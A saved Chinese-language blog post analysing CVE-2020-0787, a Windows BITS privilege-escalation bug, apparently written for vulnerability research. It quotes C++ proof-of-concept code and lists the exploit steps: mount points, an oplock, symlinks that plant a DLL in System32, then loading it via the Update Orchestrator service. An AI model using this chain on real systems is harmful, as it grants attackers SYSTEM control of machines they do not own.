<!DOCTYPE html>
<!-- saved from url=(0037)http://#/archives/213.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="https://lib.baomitu.com/">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>CVE-2020-0787分析 - lZeroyuee's Blog</title>
    <!-- Favicon -->
    <link rel="shortcut icon" href="http://lzeroyuee.cn/usr/uploads/2020/05/1330681747.png">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <!-- AmazeUI 3.0 -->
    <link rel="stylesheet" href="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/amazeui.min.css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/customui.min.css">
    <!-- CodeHighlight -->
    <style>
    .hljs{display:block;overflow-x:auto;padding:0.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;}.hljs-doctag,.hljs-keyword,.hljs-formula{color:#a626a4}.hljs-section,.hljs-name,.hljs-selector-tag,.hljs-deletion,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-string,.hljs-regexp,.hljs-addition,.hljs-attribute,.hljs-meta-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-variable,.hljs-template-variable,.hljs-type,.hljs-selector-class,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-number{color:#986801}.hljs-symbol,.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:bold}.hljs-link{text-decoration:underline}
    </style>
    <!-- FontAwesome -->
    <link href="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/font-awesome.min.css" rel="stylesheet">
    <!-- 通过自有函数输出HTML头部信息 -->
    <meta name="description" content="简介该漏洞为BITS服务任意文件移动漏洞，利用BITS没有正确的处理符号链接，而导致权限提升。漏洞详情：Microsoft Vulnerability CVE-2020-0787公开的Poc/E...">
<meta name="generator" content="Typecho 1.2/19.05.09">
<meta name="template" content="amaze">
<link rel="pingback" href="http://#/action/xmlrpc">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://#/action/xmlrpc?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://#/action/xmlrpc?wlw">
<link rel="alternate" type="application/rss+xml" title="CVE-2020-0787分析 » lZeroyuee&#39;s Blog » RSS 2.0" href="http://#/feed/archives/213.html">
<link rel="alternate" type="application/rdf+xml" title="CVE-2020-0787分析 » lZeroyuee&#39;s Blog » RSS 1.0" href="http://#/feed/rss/archives/213.html">
<link rel="alternate" type="application/atom+xml" title="CVE-2020-0787分析 » lZeroyuee&#39;s Blog » ATOM 1.0" href="http://#/feed/atom/archives/213.html">
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-213'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-213'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
        load: 'onload'
    }, added = false;

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-213'),
            input = document.createElement('input');
        input.type = 'hidden';
        input.name = '_';
        input.value = (function () {
    var _cnvpK = /* '7'//'7' */''+'85'//'Y'
+''///*'q'*/'q'
+'ac'//'91h'
+/* 's'//'s' */''+'a'//'I'
+'99'//'c'
+//'Q'
'8'+''///*'q'*/'q'
+''///*'Ej'*/'Ej'
+'1'//'Px'
+//'kh1'
'8e'+''///*'s'*/'s'
+'21'//'X'
+//'D'
'f'+'KD'//'KD'
+'0oF'//'0oF'
+/* 'j'//'j' */''+'d'//'lj'
+//'di'
'di'+//'Vl'
'16'+'be'//'HYh'
+/* 'nSM'//'nSM' */''+'88'//'4'
+//'C14'
'8'+'b9'//'Q'
+''///*'o'*/'o'
+'10'//'U'
+'3'//'jme'
+'000'//'Jp'
+''///*'Ej'*/'Ej'
+//'8Z'
'8Z'+//'SvV'
'21', _rNF9 = [[14,16],[14,17],[15,17],[30,32]];
    
    for (var i = 0; i < _rNF9.length; i ++) {
        _cnvpK = _cnvpK.substring(0, _rNF9[i][0]) + _cnvpK.substring(_rNF9[i][1]);
    }

    return _cnvpK;
})();

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                function append() {
                    if (!added) {
                        forms[0].appendChild(input);
                        added = true;
                    }
                }
            
                for (var i = 0; i < event.triggers.length; i ++) {
                    var trigger = event.triggers[i];
                    document[event.add](trigger, append);
                    window[event.add](trigger, append);
                }
            }
        }
    });
})();
</script><link rel="stylesheet" href="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/APlayer.min.css">
<script type="text/javascript" src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/APlayer.min.js.下载"></script>
<script>var meting_api="http://#/action/metingapi?server=:server&type=:type&id=:id&auth=:auth&r=:r";</script></head>

<body id="blog">
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="http://#/">lZeroyuee's Blog</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="http://lzeroyuee.cn/">Home</a>
                    </li>
                                                            <li>
                        <a href="http://lzeroyuee.cn/archives">归档</a>
                    </li>
                                        <li>
                        <a href="http://lzeroyuee.cn/about/">关于我</a>
                    </li>
                                                        </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <header class="intro-header" style="background-image: url(&#39;&#39;)">
    <div class="container">
        <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>CVE-2020-0787分析</h1>
                        <span class="meta">@lzeroyuee &nbsp;January 9, 2021</span>
                        <div class="tags post-tags"><a href="http://#/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;</div>
                    </div>
                </div>
        </div>
    </div>
    </header>

    <!-- content start -->
    <div class="container">
    <div class="am-g am-g-fixed blog-fixed">
        <div class="am-u-lg-12 am-u-sm-12">
            <article class="am-article blog-article-p article-trigger">
                <div id="post-content" class="am-article-bd">
                    <h2 id="directory050778907516492921">简介</h2><p>该漏洞为BITS服务<strong>任意文件移动</strong>漏洞，利用BITS没有正确的处理符号链接，而导致权限提升。</p><p>漏洞详情：<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0787">Microsoft Vulnerability CVE-2020-0787</a></p><p>公开的Poc/Exp项目：<a href="https://github.com/itm4n/BitsArbitraryFileMove">BitsArbitraryFileMove</a></p><h2 id="directory050778907516492922">漏洞成因分析</h2><p><strong>Background Intelligent Transfer Service（BITS）</strong>后台智能传输服务，可从HTTP Web服务器和SMB文件共享中上传或下载文件。微软官方参考文档：<a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">Background Intelligent Transfer Service</a></p><p>BITS服务针对不同版本公开了几个COM对象，如下图：</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/3363106.png" alt="1.png" title="1.png"></p><p>其中<code>Legacy Background Intelligent Transfer Control Class</code>为旧版本的“控件类”<code>BackgroundCopyQMgr</code>，其CLSID为<code>69ad4aee-51be-439b-a92c-86ae490e8b30</code></p><p>在Poc项目中，发现正是使用了<code>BackgroundCopyQMgr</code>，如下：</p><pre><code class="lang-CPP hljs">DWORD CBitsCom::PrepareJob(LPCWSTR pwszJobLocalFilename)
{
    HRESULT hRes;
    
    <span class="hljs-comment">// 创建BackgroundCopyQMgr对象实例</span>
    hRes = CoCreateInstance(__uuidof(BackgroundCopyQMgr), <span class="hljs-literal">NULL</span>, CLSCTX_LOCAL_SERVER, __uuidof(IBackgroundCopyQMgr), (<span class="hljs-keyword">void</span>**)&amp;m_pBackgroundCopyQMgr);
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-comment">// 获取Group</span>
    OLECHAR* groupGuidStr;
    hRes = m_pBackgroundCopyQMgr-&gt;GetGroup(m_guidGroup, &amp;m_pBackgroundCopyGroup);
    <span class="hljs-keyword">if</span> (SUCCEEDED(hRes))
    {
        hRes = m_pBackgroundCopyGroup-&gt;CancelGroup();    <span class="hljs-comment">// 取消Group</span>
        <span class="hljs-keyword">if</span> (FAILED(hRes))
        {
            <span class="hljs-comment">// Return Error...</span>
        }
    }

    <span class="hljs-comment">// 创建Group</span>
    hRes = m_pBackgroundCopyQMgr-&gt;CreateGroup(m_guidGroup, &amp;m_pBackgroundCopyGroup);
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-comment">// 创建任务</span>
    OLECHAR* jobGuidStr;
    hRes = m_pBackgroundCopyGroup-&gt;CreateJob(m_guidJob, &amp;m_pBackgroundCopyJob1);
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-comment">// 添加文件到任务中</span>
    FILESETINFO fileSetInfo;
    BSTR  bstrRemoteFile = SysAllocString(<span class="hljs-string">L"\\\\127.0.0.1\\C$\\Windows\\System32\\drivers\\etc\\hosts"</span>);
    BSTR  bstrLocalFile = SysAllocString(pwszJobLocalFilename);
    fileSetInfo.bstrRemoteFile = bstrRemoteFile;
    fileSetInfo.bstrLocalFile = bstrLocalFile;
    FILESETINFO* fileSetInfoArray = (FILESETINFO*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span> * <span class="hljs-keyword">sizeof</span>(FILESETINFO));
    <span class="hljs-keyword">if</span> (!fileSetInfoArray)
    {    
        <span class="hljs-comment">// Return Error...</span>
    }
    fileSetInfoArray[<span class="hljs-number">0</span>] = fileSetInfo;
    hRes = m_pBackgroundCopyJob1-&gt;AddFiles(<span class="hljs-number">1</span>, &amp;fileSetInfoArray);
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-built_in">free</span>(fileSetInfoArray);
    SysFreeString(bstrRemoteFile);
    SysFreeString(bstrLocalFile);

    <span class="hljs-keyword">return</span> BITSCOM_ERR_SUCCESS;
}</code></pre><p>此处可以发现，在使用旧版本<code>BackgroundCopyQMgr</code>类时，需要一个额外的操作即调用<code>IBackgroundCopyQMgr::CreateGroup()</code>或<code>IBackgroundCopyQMgr::GetGroup()</code>获取一个Group后才能使用<code>CreateJob</code>功能，而在新版本中不需要这一步骤</p><p>然后在Poc中，有使用<code>IBackgroundCopyQMgr::QueryNewJobInterface</code>接口</p><pre><code class="lang-CPP hljs">DWORD CBitsCom::ResumeJob()
{
    HRESULT hRes;

    <span class="hljs-comment">// --- Query new job interface --- </span>
    hRes = m_pBackgroundCopyGroup-&gt;QueryNewJobInterface(__uuidof(IBackgroundCopyJob), &amp;m_pUnkNewJobInterface);
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    CComQIPtr&lt;IBackgroundCopyJob&gt; pBackgrounCopyJob(m_pUnkNewJobInterface);
    <span class="hljs-keyword">if</span> (!pBackgrounCopyJob)
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-comment">// --- Resume job --- </span>
    hRes = pBackgrounCopyJob-&gt;Resume();
    <span class="hljs-keyword">if</span> (FAILED(hRes))
    {
        <span class="hljs-comment">// Return Error...</span>
    }

    <span class="hljs-keyword">return</span> BITSCOM_ERR_SUCCESS;
}</code></pre><p><code>IBackgroundCopyQMgr::QueryNewJobInterface</code>属于未公开接口，转到头文件<code>qmgr.h</code>中，可以发现另一个未公开接口<code>IBackgroundCopyQMgr::SetNotificationPointer</code>，函数原型如下：</p><pre><code class="lang-CPP hljs"><span class="hljs-function"><span class="hljs-keyword">virtual</span> HRESULT STDMETHODCALLTYPE <span class="hljs-title">QueryNewJobInterface</span><span class="hljs-params">( 
<span class="hljs-comment">/* [in] */</span> __RPC__in REFIID iid,
<span class="hljs-comment">/* [iid_is][out] */</span> __RPC__deref_out_opt IUnknown **pUnk)</span> </span>= <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-keyword">virtual</span> HRESULT STDMETHODCALLTYPE <span class="hljs-title">SetNotificationPointer</span><span class="hljs-params">( 
<span class="hljs-comment">/* [in] */</span> __RPC__in REFIID iid,
<span class="hljs-comment">/* [in] */</span> __RPC__in_opt IUnknown *pUnk)</span> </span>= <span class="hljs-number">0</span>;</code></pre><p>分析<code>QueryNewJobInterface</code>接口，其属于<code>qmgr!COldGroupInterface::QueryNewJobInterface</code>，此接口大致功能应该是获取一个新的Job接口</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/2671003843.png" alt="3.png" title="3.png"></p><p>紧接着从<code>CreateJob</code>开始分析整个执行流程</p><p><code>IBackgroundCopyGroup::CreateJob()</code>接口为<code>qmgr!COldGroupInterface::CreateJob</code>，其中有CFG，动态调试，直接调用的是<code>qmgr!COldGroupInterface::CreateJobInternal</code>方法：</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/2672394859.png" alt="4.png" title="4.png"></p><p>在<code>qmgr!COldGroupInterface::CreateJobInternal</code>中，最终会调用<code>CJob::CheckClientAccess</code>方法</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/4093770604.png" alt="5.png" title="5.png"></p><p>而在<code>CJob::CheckClientAccess</code>方法中，主要检查用户Token，然后创建模拟用户，使用此Token，设置到线程Token上。之后返回到<code>qmgr!COldGroupInterface::CreateJobInternal</code>中调用<code>CJob::GetOldJobExternal</code>返回了一个新的job接口指针</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/1997170928.png" alt="6.png" title="6.png"></p><p>对比<code>qmgr!COldGroupInterface::QueryNewJobInterface</code>与<code>qmgr!COldGroupInterface::CreateJob</code>执行流程不难发现，在<code>qmgr!COldGroupInterface::CreateJob</code>执行过程中存在检查Token创建模拟用户的行为，而<code>qmgr!COldGroupInterface::QueryNewJobInterface</code>没有</p><p>在上述分析的基础上，对整个执行流程做个梳理：</p><pre><code class="hljs perl"><span class="hljs-number">1</span>. 准备环境
  <span class="hljs-number">1.1</span> 禁用wow64重定向
  <span class="hljs-number">1.2</span> 创建目录%TEMP%\workspace\mountpoint\和%TEMP%\workspace\bait\目录
  <span class="hljs-number">1.3</span> 将目录%TEMP%\workspace\mountpoint\挂载到%TEMP%\workspace\bait\上
  <span class="hljs-number">1.4</span> 生成%TEMP%\workspace\Fakedll.dll
<span class="hljs-number">2</span>. 创建BackgroundCopyQMgr实例，并生成一个Group，利用Group添加job，该任务将\\<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>\C$\Windows\System32\drivers\etc\hosts传输到%TEMP%\workspace\mountpoint\test.txt文件中
<span class="hljs-number">3</span>. 查找%TEMP%\workspace\bait\BIT*.tmp文件，后面会使用，此文件应该是mountpoint目录下，mountpoint目录挂载到bait下就直接在bait下找，随后给此文件设置oplock用于同步
<span class="hljs-number">4</span>. 调用QueryNewJobInterface得到一个新的job接口，然后恢复任务等待oplock解锁
<span class="hljs-number">5</span>. oplock解锁后，取消原挂载点，创建新挂载点，将%TEMP%\workspace\mountpoint\挂载到\RPC Control
  <span class="hljs-number">5.1</span> 创建符号链接：\RPC Control\BIT*.tmp -&gt; %TEMP%\workspace\FakeDll.dll
                   \RPC Control\test.txt -&gt; C:\Windows\System32\FakeDll.dll
  <span class="hljs-number">5.2</span> 当BITS完成服务时，会将BIT*.tmp文件重命名为目标test.txt文件
综上，由于符号链接的原因，最终会将%TEMP%\workspace\FakeDll.dll移动到C:\Windows\System32\FakeDll.dll</code></pre><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/4032637616.png" alt="7.png" title="7.png"></p><p>但是，在实际监控中，只有最后对文件进行重命名时，会以System权限执行，其余均是在模拟用户权限下执行，如下： </p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/1095166095.png" alt="2.png" title="2.png"></p><p>我认为问题出在<code>MoveFileExW</code>调用链上</p><pre><code class="hljs cpp">CJob::StaticOnTransferComplete
|- CJob::OnDownloadComplete
  |- CJob::FileComplete
    |- CFile::MoveTempFile
      |- MoveFileExW</code></pre><p>于是对比了一下打补丁前后qmgr.dll的情况，发现有如下可疑之处：</p><p>在<code>CJob::FileComplete</code>中，打完补丁后，该接口在调用<code>CFile::MoveTempFile</code>前有模拟用户的操作</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/2461817318.png" alt="8.png" title="8.png"></p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/3170865699.png" alt="9.png" title="9.png"></p><p>之后修改POC，让其直接使用新版的<code>IBackgroundCopyManager </code>，普通用户权限下无法写入system32目录，以管理员权限运行会有以下调用栈</p><pre><code class="hljs ruby"><span class="hljs-number">00</span> <span class="hljs-number">000000</span>fd<span class="hljs-string">`b297d918 00007ffb`</span>e16fba8f qmgr!CFile::MoveTempFile
<span class="hljs-number">01</span> <span class="hljs-number">000000</span>fd<span class="hljs-string">`b297d920 00007ffb`</span>e16d520f qmgr!CJob::CommitTemporaryFiles+<span class="hljs-number">0x15f</span>
<span class="hljs-number">02</span> <span class="hljs-number">000000</span>fd<span class="hljs-string">`b297dac0 00007ffb`</span>e16c36cd qmgr!CJob::Complete+<span class="hljs-number">0x16f</span>
<span class="hljs-number">03</span> <span class="hljs-number">000000</span>fd<span class="hljs-string">`b297dd00 00007ffb`</span>e16c35ea qmgr!CJobExternal::CompleteInternal+<span class="hljs-number">0xc1</span>
<span class="hljs-number">04</span> <span class="hljs-number">000000</span>fd<span class="hljs-string">`b297dd80 00007ffc`</span><span class="hljs-number">03</span>d66983 qmgr!CJobExternal::Complete+<span class="hljs-number">0x1a</span></code></pre><p>在<code>qmgr!CJobExternal::CompleteInternal</code>函数中会调用<code>CJob::CheckClientAccess</code>验证访问，对于权限足够的才会调用后续的操作</p><p><img src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/49136509.png" alt="10.png" title="10.png"></p><p>故此漏洞的成因应该就是在旧接口<code>IBackgroundCopyQMgr</code>上没有模拟用户权限验证</p><h2 id="directory050778907516492923">获取System权限的shell</h2><p>在win10中，存在一个Update Session Orchestrator服务，该服务与windows更新相关，可以以普通用户权限使用COM与其通信</p><p>同时在win10上有个<code>usoclient.exe</code>工具，通过该工具执行<code>usoclient StartScan</code>命令时，此服务会尝试加载<code>windowscoredeviceinfo.dll</code>这个缺省的DLL，并调用其中的<code>QueryDeviceInformation</code>函数</p><p><a href="https://itm4n.github.io/usodllloader-part1/">usodllloader-part1</a></p><p><a href="https://itm4n.github.io/usodllloader-part2/">usodllloader-part2</a></p><h2 id="directory050778907516492924">参考</h2><p><a href="https://itm4n.github.io/cve-2020-0787-windows-bits-eop/">CVE-2020-0787 - Windows BITS - An EoP Bug Hidden in an Undocumented RPC Function</a></p><p><a href="https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html">An introduction to privileged file operation abuse on Windows</a></p>                </div>
            </article>
            <!-- <hr>
            <ul class="pager">
                <li class="previous"><a href="http://#/archives/201.html" title="CVE-2012-1876分析">CVE-2012-1876分析</a></li>
                <li class="next"><a href="http://#/archives/224.html" title="Win10 ConDrv-BSOD">Win10 ConDrv-BSOD</a></li>
            </ul> -->
            <hr>
        </div>

    </div>
    </div>
    

<div id="respond-post-213" class="comment-container">
    <div id="comments" class="clearfix">
                        <div id="respond-post-213" class="respond">
            <div class="cancel-comment-reply">
            <a id="cancel-comment-reply-link" href="http://#/archives/213.html#respond-post-213" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </div>
        
            <h3 id="response">添加新评论</h3>
            <form method="post" action="http://#/archives/213.html/comment" id="comment-form" role="form">
                                <div class="am-g">
                    <span class="am-u-lg-4 comment-input">
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="author" id="author" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4">
                        <label for="mail" class="required">Email</label>
                        <input type="email" name="mail" id="mail" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4 comment-input">
                        <label for="url">网站</label>
                        <input type="url" name="url" id="url" class="text" value="">
                    </span>
                </div>
                                <p>
                    <label for="textarea" class="required">内容</label>
                    <textarea rows="8" cols="32" name="text" id="textarea" class="textarea" required=""></textarea>
                </p>
                <p>
                    <button type="submit" class="submit am-btn am-btn-primary">提交评论</button>
                </p>
            <input type="hidden" name="_" value="85aca99818e21fd16be888b910300021"></form>
        </div>
        
            </div>
</div>    <div id="directory-content" class="directory-content initial headroom--top headroom--not-bottom">
        <div id="directory"><ul><span style="color: rgb(243, 129, 129); font-weight: 600;">目录</span><li><a href="http://#/archives/213.html#directory050778907516492921">简介</a></li><li><a href="http://#/archives/213.html#directory050778907516492922">漏洞成因分析</a></li><li><a href="http://#/archives/213.html#directory050778907516492923">获取System权限的shell</a></li><li><a href="http://#/archives/213.html#directory050778907516492924">参考</a></li></ul></div>
    </div>
    <!-- content end -->

<footer class="blog-footer">
    <ul class="list-inline text-center">
	    <li>
            <a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
            <span class="am-icon-btn am-icon-md am-icon-github footer-icon"></span>
        </a></li><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a></ul><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a><div class="blog-text-center"><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">© 2021 </a><a href="http://#/">lZeroyuee's Blog</a> 由 <a href="http://www.typecho.org/" target="_blank">Typecho</a> 强力驱动 Theme is <a href="https://spiritree.me/" target="_blank">Amaze made by Spiritree</a>
    </div>
</footer>
<script src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/jquery.slim.min.js.下载"></script>
<script src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/highlight.min.js.下载"></script>
<script>
    var $body=document.body;var $toggle=document.querySelector(".navbar-toggle");var $navbar=document.querySelector("#huxblog_navbar");var $collapse=document.querySelector(".navbar-collapse");var __HuxNav__={close:function(){$navbar.className=" ";setTimeout(function(){if($navbar.className.indexOf("in")<0){$collapse.style.height="0px"}},400)},open:function(){$collapse.style.height="auto";$navbar.className+=" in"}};$toggle.addEventListener("click",function(a){if($navbar.className.indexOf("in")>0){__HuxNav__.close()}else{__HuxNav__.open()}});document.addEventListener("click",function(a){if(a.target==$toggle){return}if(a.target.className=="icon-bar"){return}__HuxNav__.close()});jQuery(document).ready(function(c){var d=1170;if(c(window).width()>d){var b=c(".navbar-custom").height(),a=c(".intro-header .container").height();c(window).on("scroll",{previousTop:0},function(){var e=c(window).scrollTop(),f=c(".side-catalog");if(e<this.previousTop){if(e>0&&c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-visible")}else{c(".navbar-custom").removeClass("is-visible is-fixed")}}else{c(".navbar-custom").removeClass("is-visible");if(e>b&&!c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-fixed")}}this.previousTop=e;f.show();if(e>(a+41)){f.addClass("fixed")}else{f.removeClass("fixed")}})}});
</script>
<script>
    $(document).ready(function() {
        $('pre code').each(function(i, block) {
            hljs.highlightBlock(block)
        })
        $('table').addClass('am-table')
    })
</script>
<script type="text/javascript" src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/Meting.min.js.下载"></script>

<script src="./CVE-2020-0787分析 - lZeroyuee&#39;s Blog_files/headroom.min.js.下载"></script>
<script>
var postDirectoryBuild=function(){var b=function a(l,h){var k=[],e=typeof h==="object",g=typeof h==="string",j,f,d;for(f=0,d=l.length;f<d;f++){j=l[f];if((j.nodeType===1||j.nodeType===9)&&(!h||e&&h.test(j.tagName.toLowerCase())||g&&j.tagName.toLowerCase()===h)){k.push(j)}}return k},c=function(e,f,r){var n=[],m=[],h,p,d,j,l,s,o,g,k,q;h=(function(i,C,A){var w=b(i.childNodes,/^h\d$/),x=[],v=1,B=1,z=0,D=1,t="directory"+(Math.random()+"").replace(/\D/,""),B,y,u;while(w.length){u=w.shift();C.push(u.innerHTML);y=+u.tagName.match(/\d/)[0];if(y>v){x.push(1);B+=1}else{if(y===B||y>B&&y<=v){x.push(0);B=B}else{if(y<B){x.push(y-B);B=y}}}z+=x[x.length-1];v=y;u.id=u.id||(t+D++);A.push(u.id)}if(z!==0&&x[0]===1){x[0]=0}return x})(e,n,m);j=p=document.createElement("ul");q=document.createElement("span");q.style="color:#F38181;font-weight:600;";q.innerHTML="目录";p.appendChild(q);dirNum=[];for(g=0,k=h.length;g<k;g++){d=h[g];if(d===1){l=document.createElement("ul");if(!j.lastElementChild){j.appendChild(document.createElement("li"))}j.lastElementChild.appendChild(l);j=l;dirNum.push(0)}else{if(d<0){d*=2;while(d++){if(d%2){dirNum.pop()}j=j.parentNode}}}dirNum[dirNum.length-1]++;s=document.createElement("li");o=document.createElement("a");o.href="#"+m[g];o.innerHTML=!r?n[g]:dirNum.join(".")+" "+n[g];s.appendChild(o);j.appendChild(s)}f.appendChild(p)};c(document.getElementById("post-content"),document.getElementById("directory"),false)};postDirectoryBuild();
</script>
<script>
    var postDirectory = new Headroom(document.getElementById("directory-content"), {
    tolerance: 5,
    offset: 240,
    classes: {
        initial: "initial",
        pinned: "pinned",
        unpinned: "unpinned"
    }
});
postDirectory.init();
</script></body></html>